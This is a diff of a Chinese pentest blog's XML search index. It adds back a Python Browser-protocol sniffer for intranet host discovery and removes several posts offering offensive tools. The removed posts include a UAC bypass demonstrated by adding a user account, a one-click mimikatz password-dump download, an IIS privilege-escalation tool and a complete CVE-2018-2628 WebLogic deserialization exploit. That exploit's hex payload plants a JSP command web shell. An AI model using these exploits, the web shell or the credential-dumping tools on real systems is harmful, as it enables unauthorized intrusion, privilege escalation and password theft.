+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;"># -*- coding: UTF-8 -*-
+#author: k8gege
+#<a href="https://github.com/k8gege/K8tools/blob/master/K8getPC.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/K8getPC.py</a>
+#<a href="https://www.cnblogs.com/k8gege" target="_blank">https://www.cnblogs.com/k8gege</a>
+import sys
+import queue
+from scapy.all import *
+from pprint import pprint
+
+<p>def search(data, key):<br>    #print “data:  “ + data<br>    i=data.find(key)<br>    if i &gt; -1:<br>        masterType = “617574686F723A206B3867656765”<br>        masterType = data[i+len(key):i+len(key)+2]<br>        if masterType==”02”:<br>           return data[i+len(key)+4:i+len(key)+34],masterType,data[i+len(key)+44:i+len(key)+48]<br>        return data[i+len(key)+12:i+len(key)+42],masterType,data[i+len(key)+44:i+len(key)+48]<br>    return “”</p>
+<p>def getver(data):<br>    if data==”0500”:<br>        return “Win2000”<br>    elif data==”0501”:<br>        return “WinXP”<br>    elif data==”0502”:<br>        return “Win2003”<br>    elif data==”0600”:<br>        return “Vista”<br>    elif data==”0601”:<br>        return “Win7_2008”<br>    elif data==”0602”:<br>        return “Win8_2012”<br>    elif data==”0603”:<br>        return “Win8.1”<br>    elif data==”0a00”:<br>        return “Win10_2016”<br>    return data</p>
+<p>def packet_callbacke(packet):<br>    #print(packet.show())<br>    try:<br>        data=packet.load.encode(‘hex’)<br>        osname,masterType,osver = search(data, “5c4d41494c534c4f545c42524f57534500”)<br>        if (osname!=””):<br>            if masterType==”0c”:<br>                print packet.getlayer(IP).src+”\t”+packet.src+”\t”+osname.decode(‘hex’)+”\t[Domain]”<br>            else:<br>                print packet.getlayer(IP).src+”\t”+packet.src+”\t”+osname.decode(‘hex’)+”\t[“+getver(osver)+”]”<br>    except:<br>        pass</p>
+<p>print “IP\t\tMAC\t\t\tOSname\t\tOSver”</p>
+<p>try:<br>    sniff(iface = sys.argv[1],filter=””, prn=packet_callbacke)<br>except:<br>    pass<br></p></pre><p></p>
+</div>
+<p><strong>下载:</strong></p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/K8getPC.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/K8getPC.py</a></p>
+<p><a href="https://github.com/k8gege/k8getPC" target="_blank">https://github.com/k8gege/k8getPC</a></p>
+<p>&nbsp;</p>
+<p>相关文章:</p>
+<p>Cscan 获取内网主机开放Web、Banner、标题信息</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
+<p>Cping 获取内网存活主机-MAC地址-主机名--操作系统--SMB漏洞</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>源码</category>
+        <category>主机发现</category>
+        <category>内网渗透</category>
+        <category>嗅探</category>
+        <category>编程</category>
+        <category>信息收集</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Code</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -4355,205 +4591,6 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
         <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>BypassUAC</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
-    <url>/p/77429fa6.html</url>
-    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
-<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
-<p>结果保存于当前目录mz.log</p>
-<p>EXE</p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
-<p>PowerShell</p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-        <category>密码</category>
-        <category>PowerShell</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>PowerShell</tag>
-        <tag>mimikatz</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
-    <url>/p/b8e58f69.html</url>
-    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<hr>
-<ul>
-<li>漏洞威胁：RCE--远程代码执行</li>
-<li>漏洞组件：weblogic</li>
-<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
-</ul>
-<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
-# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
-
-<p>from <strong>future</strong> import print_function</p>
-<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
-<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
-<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
-return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
-<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
-<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
-<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
-<pre><code>rs=send_payload_objdata(sock, payload)
-#print(&apos;response: &apos; + rs)
-print(&apos;exploit completed!&apos;)
-print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
-print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
-<pre><code>dip = sys.argv[1]
-dport = int(sys.argv[2])
-exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
-</div>
-<h2>&nbsp;演示:</h2>
-<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
-<h2>附件说明:</h2>
-<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>GetShell</tag>
-        <tag>Weblogic</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于Browser协议探测内网主机</title>
-    <url>/p/16b5ff0b.html</url>
-    <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
-<div class="para">
-<h3 class="title-text"><img alt data-original="http://k8gege.org/k8img/posts/browser1.png"></h3>
-</div>
-<div class="para">
-<h3 class="title-text">浏览</h3>
-<div class="para">在SMB协议中，计算机为了访问<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%B5%84%E6%BA%90" target="_blank">网络资源</a>，就需要了解网络上存在的资源列表（例如在Windows下使用网络邻居查看可以访问的计算机），这个机制就被称为浏览（Browsing）。虽然SMB协议中经常使用广播的方式，但如果每次都使用广播的方式了解当前的网络资源（包括提供服务的计算机和各个计算机上的服务资源），就需要消耗大量的网络资源和浪费较长的查找时间，因此最好在网络中维护一个网络资源的列表，以方便查找网络资源。只有必要的时候，才重新查找资源，例如使用Windows下的查找计算机<a href="https://baike.baidu.com/item/%E5%8A%9F%E8%83%BD" target="_blank">功能</a>。</div>
-</div>
-<div class="para">但没有必要每个计算机都维护整个资源列表，维护网络中当前资源列表的任务由网络上的几个特殊计算机完成的，这些计算机被称为Browser，这些Browser通过记录广播数据或查询名字服务器来记录网络上的各种资源。</div>
-<div class="para">Browser并不是事先指定的计算机，而是在普通计算机之间通过自动进行的推举产生的。不同的计算机可以按照其提供服务的能力，设置在推举时具备的不同权重。为了保证一个Browser停机时网络浏览仍然正常，网络中常常存在多个Browser，一个为主Browser（Master Browser），其他的为备份Browser。</div>
-<div class="anchor-list"><a class="lemma-anchor para-title" name="2_2"></a> <a class="lemma-anchor " name="sub3004457_2_2"></a> <a class="lemma-anchor " name="工作组和域"></a> <a class="lemma-anchor " name="2-2"></a></div>
-<div class="para-title level-3">
-<h3 class="title-text">工作组和域</h3>
-</div>
-<div class="para">工作组和域这两个概念在进行浏览时具备同样的用处，都是用于区分并维护同一组浏览数据的多个计算机。事实上他们的不同在于认证方式上，工作组中每台计算机都基本上是独立的，独立对客户访问进行认证，而域中将存在一个（或几个）<a href="https://baike.baidu.com/item/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">域控制器</a>，保存对整个域中都有效的认证信息，包括用户的认证信息以及域内成员计算机的认证信息。浏览数据的时候，并不需要认证信息，Microsoft将工作组扩展为域，只是为了形成一种分级的目录结构，将原有的浏览和<a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1" target="_blank">目录服务</a>相结合，以扩大Mircrosoft网络服务范围的一种策略。 　工作组和域都可以跨越多个子网，因此网络中就存在两种Browser，一种为Domain Master Browser ，用于维护整个工作组或域内的浏览数据，另一种为Local Master Browser，用于维护本子网内的浏览<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/33305" target="_blank" data-lemmaid="33305">数据</a>，它和Domain Master Browser通信以获得所有的可浏览数据。划分这两种Browser 主要是由于浏览数据依赖于本地网广播来获得资源列表，不同子网之间只能通过浏览器之间的交流能力，才能互相交换资源列表。</div>
-<div class="para">但是，为了浏览多个子网的资源，必须使用NBNS名字服务器的解析方式，没有NBNS的帮助，计算机将不能获得子网外计算机的NetBIOS名字。Local Master Browser也需要查询NetBIOS名字服务器以获得Domain Master Browser的名字，以相互交换网络资源信息。</div>
-<div class="para">由于<a href="https://baike.baidu.com/item/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">域控制器</a>在域内的特殊性，因此域控制器倾向于被用做Browser，<a href="https://baike.baidu.com/item/%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">主域控制器</a>应该被用作Domain Master Browser，他们在推举时设置的权重较大。</div>
-<p><span style="font-size: 14px;"><strong>Browser发包时间</strong></span></p>
-<p>去年无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2分钟、5分钟、甚至12分钟等才发</p>
-<p>几分钟甚至于10几分钟才有一条，其它数据包每分钟几百条，可能很多人长时间抓包，也未能发现关键信息</p>
-<p>不单只是很长时间才发，而且也不一定每个包里面都含有机器名，或许这就是一直以来把Browser忽略的真相</p>
-<p>如图所示，出现13机器ID为6247数据包，出现15机器已达到2万多，出现10机器已7万多个包(这鬼才能发现)</p>
-<p>所以为了能够获取到内网机器信息，我们需要不停的监视Browser包，从中提取有效机器名与系统版本</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/browser2.png"></p>
-<p>&nbsp;<strong>无视防火墙</strong></p>
-<p>虽然属于SMB协议，但把文件和共享前的勾去掉依旧可获取,该报文是由目标机器向外发送，所以445关闭也不影响</p>
-<p>在目标开启防火墙的情况下也可获取,这与cping通过445端口或ICMP探测主机方式不一样。<br>另外发现NBNS也含有机器名和域名,但无系统版本,如下图<img alt data-original="http://k8gege.org/k8img/posts/browser3.png"></p>
-<p><span style="font-size: 16px;"><strong>操作系统、域机器判断</strong></span></p>
-<p>除了XP和WIN8.1特别一点以外，其它系统</p>
-<p>0x00000002 Request XP名称第3位开始&nbsp; Win8.1也是 无法判断系统版本<br>0x0000000c Domain &nbsp;<span style="color: #ff00ff;">域内机器</span><br>其它 of o1 local<br><br>by K8哥哥 2018.11.26</p>
-<p><span style="font-size: 16px;"><strong>&nbsp;<span style="color: #000000;">利用代码</span></strong></span></p>
-<p>暂时没时间用其它语言编写,先用python的scapy框架来实现,如果要编译成可执行文件可能会很大,可能还要安装相关依赖</p>
-<p>&nbsp;</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;"># -*- coding: UTF-8 -*-
-#author: k8gege
-#<a href="https://github.com/k8gege/K8tools/blob/master/K8getPC.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/K8getPC.py</a>
-#<a href="https://www.cnblogs.com/k8gege" target="_blank">https://www.cnblogs.com/k8gege</a>
-import sys
-import queue
-from scapy.all import *
-from pprint import pprint
-
-<p>def search(data, key):<br>    #print “data:  “ + data<br>    i=data.find(key)<br>    if i &gt; -1:<br>        masterType = “617574686F723A206B3867656765”<br>        masterType = data[i+len(key):i+len(key)+2]<br>        if masterType==”02”:<br>           return data[i+len(key)+4:i+len(key)+34],masterType,data[i+len(key)+44:i+len(key)+48]<br>        return data[i+len(key)+12:i+len(key)+42],masterType,data[i+len(key)+44:i+len(key)+48]<br>    return “”</p>
-<p>def getver(data):<br>    if data==”0500”:<br>        return “Win2000”<br>    elif data==”0501”:<br>        return “WinXP”<br>    elif data==”0502”:<br>        return “Win2003”<br>    elif data==”0600”:<br>        return “Vista”<br>    elif data==”0601”:<br>        return “Win7_2008”<br>    elif data==”0602”:<br>        return “Win8_2012”<br>    elif data==”0603”:<br>        return “Win8.1”<br>    elif data==”0a00”:<br>        return “Win10_2016”<br>    return data</p>
-<p>def packet_callbacke(packet):<br>    #print(packet.show())<br>    try:<br>        data=packet.load.encode(‘hex’)<br>        osname,masterType,osver = search(data, “5c4d41494c534c4f545c42524f57534500”)<br>        if (osname!=””):<br>            if masterType==”0c”:<br>                print packet.getlayer(IP).src+”\t”+packet.src+”\t”+osname.decode(‘hex’)+”\t[Domain]”<br>            else:<br>                print packet.getlayer(IP).src+”\t”+packet.src+”\t”+osname.decode(‘hex’)+”\t[“+getver(osver)+”]”<br>    except:<br>        pass</p>
-<p>print “IP\t\tMAC\t\t\tOSname\t\tOSver”</p>
-<p>try:<br>    sniff(iface = sys.argv[1],filter=””, prn=packet_callbacke)<br>except:<br>    pass<br></p></pre><p></p>
-</div>
-<p><strong>下载:</strong></p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/K8getPC.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/K8getPC.py</a></p>
-<p><a href="https://github.com/k8gege/k8getPC" target="_blank">https://github.com/k8gege/k8getPC</a></p>
-<p>&nbsp;</p>
-<p>相关文章:</p>
-<p>Cscan 获取内网主机开放Web、Banner、标题信息</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
-<p>Cping 获取内网存活主机-MAC地址-主机名--操作系统--SMB漏洞</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>主机发现</category>
-        <category>源码</category>
-        <category>嗅探</category>
-        <category>内网渗透</category>
-        <category>信息收集</category>
-        <category>Python</category>
-        <category>编程</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Code</tag>
-        <tag>Python</tag>
       </tags>
   </entry>
 </search>
